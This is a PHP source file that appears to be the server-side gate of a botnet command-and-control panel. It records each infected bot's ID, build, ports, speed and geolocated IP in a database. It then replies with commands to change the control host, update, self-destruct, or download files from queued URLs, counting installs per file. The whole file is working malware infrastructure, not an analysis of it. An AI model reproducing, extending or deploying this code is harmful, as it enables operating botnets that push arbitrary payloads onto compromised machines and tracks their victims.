<?

function get_geography($clientIP)
{
        $data = array(
                         "country"      => "00",
                         "country_full" => "unknown",
                         "city"         => "-",
                         "region"       => "-"
        );

        $geoip = Net_GeoIP::getInstance("GeoIP.dat");
        // country...
        try {

                 $country = $geoip->lookupCountryCode($clientIP);
                 if (!empty($country))
                         $data['country'] = $country;

        } catch (Exception $e) {
        //         print "Net_GeoIP : EXEPTION\n";
        }

        try {

                 $country_full = $geoip->lookupCountryName($clientIP);
                 if (!empty($country_full))
                         $data['country_full'] = $country_full;

        } catch (Exception $e) {
        //         print "Net_GeoIP : EXEPTION\n";
        }

        $geoip = Net_GeoIP::getInstance("GeoLiteCity.dat");
        // city and state
        try {

                 $location = $geoip->lookupLocation($clientIP);

                 if (isset($location->city) && !empty($location->city))
                        $data['city'] = $location->city;

                 if (isset($location->region) && !empty($location->region))
                        $data['region'] = $location->region;

        } catch (Exception $e) {
        //         print "Net_GeoIP : EXEPTION\n";
        }

        return $data;
}

require_once "Net/GeoIP.php";
require_once "common.php";

$bot_id   = addslashes(@$_POST['bot_id']);
$build_id = addslashes(@$_POST['build_id']);
$sport    = intval(@$_POST['sport']);
$hport    = intval(@$_POST['hport']);
$ping     = intval(@$_POST['ping']);
$speed    = intval(@$_POST['speed']);

if (!empty($bot_id) && !empty($build_id) && !empty($sport) && !empty($hport))
{
     $addr = $_SERVER['REMOTE_ADDR'];
     $geo = get_geography($addr);

     $cmd = array();

     $sql = "SELECT * FROM `opt`";
     $r = db_query($sql);
     while ($f = mysql_fetch_array($r))
     {
            if ($f['name'] == "chost" && !empty($f['value']))
                  $cmd[] = "chost {$f['value']}";
            elseif ($f['name'] == "upd" && !empty($f['value']))
                  $cmd[] = "upd {$f['value']}";
     }

     $sql = "SELECT `files`, `kill` FROM `stat` WHERE `id`='$bot_id'";
     $r = db_query($sql);

     $files = array();
     if (mysql_num_rows($r) == 1)
     {
         $f = mysql_fetch_array($r);

         if ($f['kill'] == '1') $cmd[] = "die";

         $files = @unserialize($f['files']);
     }

     $sql = "SELECT * FROM `files` WHERE `dnum`>`dtotal` OR `dnum`='0'";
     $r = db_query($sql);

     while ($f = mysql_fetch_array($r))
     {
         $f_id = $f['id'];

         if (!isset($files[$f_id]))
         {
              $cmd[] = "get {$f['url']}";

              $sql = "UPDATE `files` SET `dtotal`=`dtotal`+1 WHERE id='$f_id'";
              db_query($sql);

              $files[$f_id] = time();

              break;
         }
     }

     $sql = "REPLACE INTO `stat`
             (`id`, `build_id`, `addr`, `country`, `country_full`, `city`, `region`, `sport`, `hport`, `ping`, `speed`, `last_request`, `files`)
             VALUES
             ('$bot_id', '$build_id', '$addr', '{$geo['country']}', '{$geo['country_full']}', '{$geo['city']}', '{$geo['region']}', '$sport', '$hport', '$ping', '$speed', '".time()."', '".serialize($files)."')
     ";

     db_query($sql);

     echo implode(";", $cmd)."#$addr";
}

?>